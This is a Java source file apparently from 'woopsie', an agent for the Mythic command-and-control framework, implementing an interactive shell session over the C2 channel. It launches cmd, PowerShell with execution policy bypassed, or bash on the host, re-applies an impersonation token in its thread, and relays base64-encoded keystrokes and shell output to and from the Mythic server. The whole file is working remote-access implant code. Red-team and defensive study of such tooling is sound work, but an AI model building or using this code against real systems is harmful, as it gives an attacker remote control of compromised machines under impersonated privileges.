package com.woopsie.tasks;

import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.woopsie.Config;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.nio.charset.StandardCharsets;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

/**
 * Background task for PTY (pseudo-terminal) interaction with shells
 * Based on oopsie's pty.rs implementation
 * Uses interactive message directive for bidirectional communication
 */
public class PtyBackgroundTask implements Runnable {
    private final BackgroundTask task;
    private final Config config;
    private static final ObjectMapper mapper = new ObjectMapper();
    
    // PTY Message Types (must match Mythic's PTY message types)
    private static final int PTY_INPUT = 0;
    private static final int PTY_OUTPUT = 1;
    private static final int PTY_ERROR = 2;
    private static final int PTY_EXIT = 3;
    private static final int PTY_ESCAPE = 4;
    private static final int PTY_CTRL_A = 5;
    private static final int PTY_CTRL_B = 6;
    private static final int PTY_CTRL_C = 7;
    private static final int PTY_CTRL_D = 8;
    private static final int PTY_CTRL_E = 9;
    private static final int PTY_CTRL_F = 10;
    private static final int PTY_CTRL_G = 11;
    private static final int PTY_BACKSPACE = 12;
    private static final int PTY_TAB = 13;
    private static final int PTY_CTRL_K = 14;
    private static final int PTY_CTRL_L = 15;
    private static final int PTY_CTRL_N = 16;
    private static final int PTY_CTRL_P = 17;
    private static final int PTY_CTRL_Q = 18;
    private static final int PTY_CTRL_R = 19;
    private static final int PTY_CTRL_S = 20;
    private static final int PTY_CTRL_U = 21;
    private static final int PTY_CTRL_W = 22;
    private static final int PTY_CTRL_Y = 23;
    private static final int PTY_CTRL_Z = 24;
    
    private Process shellProcess;
    private OutputStream processInput;
    private final com.sun.jna.platform.win32.WinNT.HANDLE impersonationToken;
    
    public PtyBackgroundTask(BackgroundTask task, Config config, com.sun.jna.platform.win32.WinNT.HANDLE impersonationToken) {
        this.task = task;
        this.config = config;
        this.impersonationToken = impersonationToken;
    }
    
    @Override
    public void run() {
        // Re-apply impersonation token if present (each thread needs its own token applied)
        if (impersonationToken != null) {
            try {
                Config.debugLog(config, "Re-applying impersonation token in pty background thread");
                com.woopsie.utils.WindowsAPI.reApplyToken(impersonationToken);
            } catch (Exception e) {
                Config.debugLog(config, "[PTY] Failed to apply impersonation token: " + e.getMessage());
            }
        }
        
        Config.debugLog(config, "[PTY] PTY thread started for task " + task.taskId);
        
        try {
            // Parse parameters to get program to spawn
            JsonNode params = mapper.readTree(task.parameters);
            String program = params.has("program") ? params.get("program").asText() : "bash";
            
            Config.debugLog(config, "[PTY] Spawning shell: " + program);
            
            // Send initial "interacting" response
            Map<String, Object> response = new HashMap<>();
            response.put("task_id", task.taskId);
            response.put("status", "processing");
            response.put("user_output", "Interacting with program: " + program + "\n");
            response.put("completed", false);
            task.sendResponse(response);
            
            // Spawn process using ProcessBuilder (compatible with native-image)
            String[] command = buildCommand(program);
            ProcessBuilder pb = new ProcessBuilder(command);
            pb.redirectErrorStream(true); // Merge stderr into stdout for simpler handling
            shellProcess = pb.start();
            
            processInput = shellProcess.getOutputStream();
            
            Config.debugLog(config, "[PTY] Shell spawned successfully");
            
            // Start output reader thread
            Thread outputThread = new Thread(this::readOutput);
            outputThread.setDaemon(true);
            outputThread.start();
            
            // Start error reader thread
            Thread errorThread = new Thread(this::readError);
            errorThread.setDaemon(true);
            errorThread.start();
            
            // Main loop - process messages from Mythic
            while (task.running && shellProcess.isAlive()) {
                try {
                    // Wait for interactive messages from Mythic
                    JsonNode message = task.getToTaskQueue().poll(50, java.util.concurrent.TimeUnit.MILLISECONDS);
                    
                    if (message != null) {
                        handleInteractiveMessage(message);
                    }
                } catch (InterruptedException e) {
                    Config.debugLog(config, "[PTY] Interrupted while waiting for message");
                    break;
                } catch (Exception e) {
                    Config.debugLog(config, "[PTY] Error processing message: " + e.getMessage());
                }
            }
            
            Config.debugLog(config, "[PTY] Shell process exited or task stopped");
            
        } catch (Exception e) {
            Config.debugLog(config, "[PTY] Error in PTY task: " + e.getMessage());
            sendError("PTY error: " + e.getMessage());
        } finally {
            cleanup();
        }
        
        // Send final completion message
        Map<String, Object> finalResponse = new HashMap<>();
        finalResponse.put("task_id", task.taskId);
        finalResponse.put("status", "success");
        finalResponse.put("user_output", "Shell session ended");
        finalResponse.put("completed", true);
        task.sendResponse(finalResponse);
        
        Config.debugLog(config, "[PTY] PTY task completed");
    }
    
    /**
     * Build command array based on program type
     */
    private String[] buildCommand(String program) {
        String progLower = program.toLowerCase();
        
        if (progLower.contains("cmd")) {
            return new String[]{program, "/Q", "/D"};
        } else if (progLower.contains("powershell") || progLower.contains("pwsh")) {
            return new String[]{program, "-NoLogo", "-NoProfile", "-ExecutionPolicy", "Bypass"};
        } else {
            // For bash/sh/zsh - use non-interactive mode for cleaner output
            return new String[]{program};
        }
    }
    
    /**
     * Handle interactive message from Mythic
     * Interactive messages come as individual objects, not arrays
     */
    private void handleInteractiveMessage(JsonNode message) {
        try {
            Config.debugLog(config, "[PTY] Processing interactive message: " + message);
            
            int messageType = message.get("message_type").asInt();
            String data = message.has("data") && !message.get("data").isNull() 
                ? message.get("data").asText() : "";
            
            Config.debugLog(config, "[PTY] Message type: " + messageType + ", data: " + data);
            
            switch (messageType) {
                case PTY_INPUT:
                    handleInput(data);
                    break;
                case PTY_EXIT:
                    Config.debugLog(config, "[PTY] Received exit command");
                    writeToProcess("exit\n");
                    task.running = false;
                    break;
                case PTY_ESCAPE:
                    writeToProcess(new byte[]{0x1B});
                    break;
                case PTY_BACKSPACE:
                    writeToProcess(new byte[]{0x08});
                    break;
                case PTY_TAB:
                    writeToProcess(new byte[]{0x09});
                    break;
                case PTY_CTRL_A:
                    writeToProcess(new byte[]{0x01});
                    break;
                case PTY_CTRL_B:
                    writeToProcess(new byte[]{0x02});
                    break;
                case PTY_CTRL_C:
                    writeToProcess(new byte[]{0x03});
                    break;
                case PTY_CTRL_D:
                    writeToProcess(new byte[]{0x04});
                    break;
                case PTY_CTRL_E:
                    writeToProcess(new byte[]{0x05});
                    break;
                case PTY_CTRL_F:
                    writeToProcess(new byte[]{0x06});
                    break;
                case PTY_CTRL_G:
                    writeToProcess(new byte[]{0x07});
                    break;
                case PTY_CTRL_K:
                    writeToProcess(new byte[]{0x0B});
                    break;
                case PTY_CTRL_L:
                    writeToProcess(new byte[]{0x0C});
                    break;
                case PTY_CTRL_N:
                    writeToProcess(new byte[]{0x0E});
                    break;
                case PTY_CTRL_P:
                    writeToProcess(new byte[]{0x10});
                    break;
                case PTY_CTRL_Q:
                    writeToProcess(new byte[]{0x11});
                    break;
                case PTY_CTRL_R:
                    writeToProcess(new byte[]{0x12});
                    break;
                case PTY_CTRL_S:
                    writeToProcess(new byte[]{0x13});
                    break;
                case PTY_CTRL_U:
                    writeToProcess(new byte[]{0x15});
                    break;
                case PTY_CTRL_W:
                    writeToProcess(new byte[]{0x17});
                    break;
                case PTY_CTRL_Y:
                    writeToProcess(new byte[]{0x19});
                    break;
                case PTY_CTRL_Z:
                    writeToProcess(new byte[]{0x1A});
                    break;
                default:
                    Config.debugLog(config, "[PTY] Unknown message type: " + messageType);
            }
        } catch (Exception e) {
            Config.debugLog(config, "[PTY] Error handling interactive message: " + e.getMessage());
        }
    }
    
    /**
     * Handle input data (base64 decoded)
     */
    private void handleInput(String base64Data) {
        if (base64Data == null || base64Data.isEmpty()) {
            return;
        }
        
        try {
            byte[] data = Base64.getDecoder().decode(base64Data);
            String input = new String(data, StandardCharsets.UTF_8);
            Config.debugLog(config, "[PTY] Writing input to shell: " + input.trim());
            
            // Check for exit command
            if (input.trim().equalsIgnoreCase("exit")) {
                Config.debugLog(config, "[PTY] Detected 'exit' command, terminating session");
                writeToProcess("exit\n");
                task.running = false;
                return;
            }
            
            writeToProcess(data);
        } catch (Exception e) {
            Config.debugLog(config, "[PTY] Error handling input: " + e.getMessage());
        }
    }
    
    /**
     * Write data to process stdin
     */
    private void writeToProcess(String data) {
        writeToProcess(data.getBytes(StandardCharsets.UTF_8));
    }
    
    /**
     * Write bytes to process stdin
     */
    private void writeToProcess(byte[] data) {
        try {
            if (processInput != null) {
                processInput.write(data);
                processInput.flush();
            }
        } catch (IOException e) {
            Config.debugLog(config, "[PTY] Error writing to process: " + e.getMessage());
        }
    }
    
    /**
     * Read output from process stdout
     */
    private void readOutput() {
        try (BufferedReader reader = new BufferedReader(
                new InputStreamReader(shellProcess.getInputStream(), StandardCharsets.UTF_8))) {
            
            StringBuilder buffer = new StringBuilder();
            long lastOutputTime = System.currentTimeMillis();
            
            while (task.running && shellProcess.isAlive()) {
                try {
                    // Check if data is available
                    if (reader.ready()) {
                        char[] chars = new char[1024];
                        int read = reader.read(chars);
                        if (read > 0) {
                            buffer.append(chars, 0, read);
                            lastOutputTime = System.currentTimeMillis();
                        }
                    }
                    
                    // Flush buffer if we have data and enough time has passed (debounce)
                    long timeSinceOutput = System.currentTimeMillis() - lastOutputTime;
                    if (buffer.length() > 0 && (timeSinceOutput >= 200 || buffer.length() > 1024)) {
                        sendOutput(buffer.toString());
                        buffer.setLength(0);
                    }
                    
                    Thread.sleep(10);
                } catch (InterruptedException e) {
                    break;
                } catch (IOException e) {
                    Config.debugLog(config, "[PTY][stdout] Read error: " + e.getMessage());
                    break;
                }
            }
            
            // Flush any remaining output
            if (buffer.length() > 0) {
                sendOutput(buffer.toString());
            }
            
        } catch (IOException e) {
            Config.debugLog(config, "[PTY][stdout] Error: " + e.getMessage());
        }
    }
    
    /**
     * Read error output from process stderr (not used since we redirect stderr to stdout)
     */
    private void readError() {
        // Since redirectErrorStream(true), stderr is merged into stdout
        // This method is kept for compatibility but does nothing
    }
    
    /**
     * Send output to Mythic via interactive message
     */
    private void sendOutput(String output) {
        sendInteractive(PTY_OUTPUT, output);
        Config.debugLog(config, "[PTY] Sent output (" + output.length() + " chars)");
    }
    
    /**
     * Send error output to Mythic via interactive message
     */
    private void sendError(String error) {
        sendInteractive(PTY_ERROR, error);
        Config.debugLog(config, "[PTY] Sent error (" + error.length() + " chars)");
    }
    
    /**
     * Send interactive message to Mythic
     * Interactive messages go at the top level of the response, not inside the task response
     */
    private void sendInteractive(int messageType, String data) {
        try {
            String base64Data = Base64.getEncoder().encodeToString(data.getBytes(StandardCharsets.UTF_8));
            
            Map<String, Object> interactive = new HashMap<>();
            interactive.put("task_id", task.taskId);
            interactive.put("message_type", messageType);
            interactive.put("data", base64Data);
            
            // Interactive messages must be sent at the top level (not inside responses)
            // This is handled by BackgroundTask.sendInteractive()
            task.sendInteractive(interactive);
            
        } catch (Exception e) {
            Config.debugLog(config, "[PTY] Error sending interactive message: " + e.getMessage());
        }
    }
    
    /**
     * Cleanup resources
     */
    private void cleanup() {
        try {
            if (processInput != null) {
                processInput.close();
            }
            if (shellProcess != null && shellProcess.isAlive()) {
                shellProcess.destroy();
                // Wait up to 5 seconds for graceful shutdown
                if (!shellProcess.waitFor(5, java.util.concurrent.TimeUnit.SECONDS)) {
                    shellProcess.destroyForcibly();
                }
            }
        } catch (Exception e) {
            Config.debugLog(config, "[PTY] Error during cleanup: " + e.getMessage());
        }
    }
}
